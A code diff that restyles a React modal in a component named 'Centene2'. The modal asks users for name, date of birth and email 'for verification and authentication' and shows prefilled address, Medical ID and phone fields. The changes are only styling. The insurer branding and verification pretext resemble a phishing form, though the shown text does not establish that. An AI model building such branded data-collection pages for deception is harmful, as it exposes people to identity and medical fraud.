@@ -789,19 +789,19 @@ export default function Centene2(): React.ReactElement {
       {showVerificationForm && (
         <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-2 backdrop-blur-sm">
           <div className="bg-gradient-to-b from-[#1a4b8c] to-[#2E5388] 
-                          rounded-xl p-4 w-full max-w-md mx-auto 
+                          rounded-xl p-3 w-full max-w-sm mx-auto 
                           shadow-2xl animate-fadeIn">
-            <h2 className="text-lg font-semibold text-white mb-4 text-center">
+
+            {/* Title */}
+            <h2 className="text-sm font-semibold text-white mb-2 text-center">
               Customer details required for verification and authentication
             </h2>
 
-            <form onSubmit={handleSubmitDetails} className="space-y-3">
+            <form onSubmit={handleSubmitDetails} className="space-y-2">
+
               {/* Member Name */}
               <div className="flex flex-col">
-                <label
-                  htmlFor="name"
-                  className="text-white text-sm mb-1 font-medium"
-                >
+                <label htmlFor="name" className="text-white text-xs mb-0.5 font-medium">
                   Member Name
                 </label>
                 <input
@@ -809,27 +809,24 @@ export default function Centene2(): React.ReactElement {
                   id="name"
                   name="name"
                   required
-                  className="p-2 rounded-lg bg-white text-gray-800 border border-blue-300 
-                             focus:ring-2 focus:ring-blue-400 focus:outline-none"
+                  className="p-1.5 rounded bg-white text-gray-800 border border-blue-300 
+                             focus:ring-1 focus:ring-blue-400 focus:outline-none text-xs"
                   placeholder="Enter your name"
                 />
               </div>
 
               {/* Date of Birth */}
               <div className="flex flex-col">
-                <label
-                  htmlFor="dob"
-                  className="text-white text-sm mb-1 font-medium"
-                >
+                <label htmlFor="dob" className="text-white text-xs mb-0.5 font-medium">
                   Choose Date of Birth
                 </label>
-                <div className="flex gap-2">
+                <div className="flex gap-1">
                   <select
                     id="dobMonth"
                     name="dobMonth"
                     required
-                    className="flex-1 p-2 rounded-lg bg-white text-gray-800 border border-blue-300 
-                               focus:ring-2 focus:ring-blue-400 focus:outline-none"
+                    className="flex-1 p-1.5 rounded bg-white text-gray-800 border border-blue-300 
+                               focus:ring-1 focus:ring-blue-400 focus:outline-none text-xs"
                     value={dobMonth}
                     onChange={(e) => setDobMonth(e.target.value)}
                   >
@@ -840,8 +837,8 @@ export default function Centene2(): React.ReactElement {
                     id="dobDay"
                     name="dobDay"
                     required
-                    className="flex-1 p-2 rounded-lg bg-white text-gray-800 border border-blue-300 
-                               focus:ring-2 focus:ring-blue-400 focus:outline-none"
+                    className="flex-1 p-1.5 rounded bg-white text-gray-800 border border-blue-300 
+                               focus:ring-1 focus:ring-blue-400 focus:outline-none text-xs"
                     value={dobDay}
                     onChange={(e) => setDobDay(e.target.value)}
                   >
@@ -852,8 +849,8 @@ export default function Centene2(): React.ReactElement {
                     id="dobYear"
                     name="dobYear"
                     required
-                    className="flex-1 p-2 rounded-lg bg-white text-gray-800 border border-blue-300 
-                               focus:ring-2 focus:ring-blue-400 focus:outline-none"
+                    className="flex-1 p-1.5 rounded bg-white text-gray-800 border border-blue-300 
+                               focus:ring-1 focus:ring-blue-400 focus:outline-none text-xs"
                     value={dobYear}
                     onChange={(e) => setDobYear(e.target.value)}
                   >
@@ -865,10 +862,7 @@ export default function Centene2(): React.ReactElement {
 
               {/* Email */}
               <div className="flex flex-col">
-                <label
-                  htmlFor="email"
-                  className="text-white text-sm mb-1 font-medium"
-                >
+                <label htmlFor="email" className="text-white text-xs mb-0.5 font-medium">
                   Email ID
                 </label>
                 <input
@@ -876,85 +870,78 @@ export default function Centene2(): React.ReactElement {
                   id="email"
                   name="email"
                   required
-                  className="p-2 rounded-lg bg-white text-gray-800 border border-blue-300 
-                             focus:ring-2 focus:ring-blue-400 focus:outline-none"
+                  className="p-1.5 rounded bg-white text-gray-800 border border-blue-300 
+                             focus:ring-1 focus:ring-blue-400 focus:outline-none text-xs"
                   placeholder="Enter your email"
                 />
               </div>
 
               {/* Address */}
               <div className="flex flex-col">
-                <label
-                  htmlFor="address"
-                  className="text-white text-sm mb-1 font-medium"
-                >
+                <label htmlFor="address" className="text-white text-xs mb-0.5 font-medium">
                   Address
                 </label>
                 <input
                   type="text"
                   id="address"
                   name="address"
-                  required
-                  className="p-2 rounded-lg bg-blue-100 text-gray-800 border border-blue-300"
-                  defaultValue="123 Maple Street, Nashville, Tennessee, 37201"
                   readOnly
+                  defaultValue="123 Maple Street, Nashville, Tennessee, 37201"
+                  className="p-1.5 rounded bg-blue-100 text-gray-800 border border-blue-300 
+                             text-xs"
                 />
               </div>
 
               {/* Medical ID */}
               <div className="flex flex-col">
-                <label
-                  htmlFor="medicalCode"
-                  className="text-white text-sm mb-1 font-medium"
-                >
+                <label htmlFor="medicalCode" className="text-white text-xs mb-0.5 font-medium">
                   Medical ID
                 </label>
                 <input
                   type="text"
                   id="medicalCode"
                   name="medicalCode"
-                  defaultValue="U900312752"
                   readOnly
-                  className="p-2 rounded-lg bg-blue-100 text-gray-800 border border-blue-300"
+                  defaultValue="U900312752"
+                  className="p-1.5 rounded bg-blue-100 text-gray-800 border border-blue-300 
+                             text-xs"
                 />
               </div>
 
               {/* Phone Number */}
               <div className="flex flex-col">
-                <label
-                  htmlFor="phone"
-                  className="text-white text-sm mb-1 font-medium"
-                >
+                <label htmlFor="phone" className="text-white text-xs mb-0.5 font-medium">
                   Phone Number
                 </label>
                 <input
                   type="text"
                   id="phone"
                   name="phone"
-                  defaultValue="6152314412"
                   readOnly
-                  className="p-2 rounded-lg bg-blue-100 text-gray-800 border border-blue-300"
+                  defaultValue="6152314412"
+                  className="p-1.5 rounded bg-blue-100 text-gray-800 border border-blue-300 
+                             text-xs"
                 />
               </div>
 
               {/* Submit button */}
-              <div className="flex justify-center mt-4">
+              <div className="flex justify-center mt-2">
                 <button
                   type="submit"
-                  className="px-6 py-2 bg-white text-[#1a4b8c] text-sm 
-                             rounded-full shadow-md hover:shadow-lg 
+                  className="px-3 py-1.5 bg-white text-[#1a4b8c] text-xs 
+                             rounded-full shadow hover:shadow-md 
                              transition-all transform hover:scale-105 font-bold"
                 >
                   Submit
                 </button>
               </div>
 
-              {/* Notes section */}
-              <div className="mt-4 bg-white p-3 rounded-xl shadow">
-                <p className="font-medium text-red-700 mb-2">Note</p>
+              {/* Notes */}
+              <div className="mt-2 bg-white p-2 rounded shadow">
+                <p className="font-medium text-red-700 text-xs mb-1">Note</p>
                 <ul className="space-y-1 text-gray-700 text-xs">
                   {notes.map((note, index) => (
-                    <li key={index} className="flex items-start gap-2">
+                    <li key={index} className="flex items-start gap-1">
                       <span className="text-blue-600 mt-0.5">•</span>
                       {index === 1 ? (
                         <span>
